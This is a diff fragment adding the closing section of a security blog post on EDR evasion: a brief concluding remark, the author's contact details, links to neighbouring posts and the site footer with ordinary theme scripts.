+<p>These techniques highlight the ongoing cat-and-mouse game between offensive and defensive security. While effective against current detection rules, EDR vendors continuously update their signatures and behavioral analytics.</p>
+<p>If you&rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/evasion/">Evasion</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/hacking/gcc/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>ElfDoor-gcc</span>
+  </a>
+  <a class="next" href="http://localhost:1313/hacking/ldpreload-rootkit/">
+    <span class="title">Next »</span>
+    <br>
+    <span>How detect a LD_PRELOAD rootkit and hide from ldd &amp; /proc</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2025 <a href="http://localhost:1313/">0xMatheuZ</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
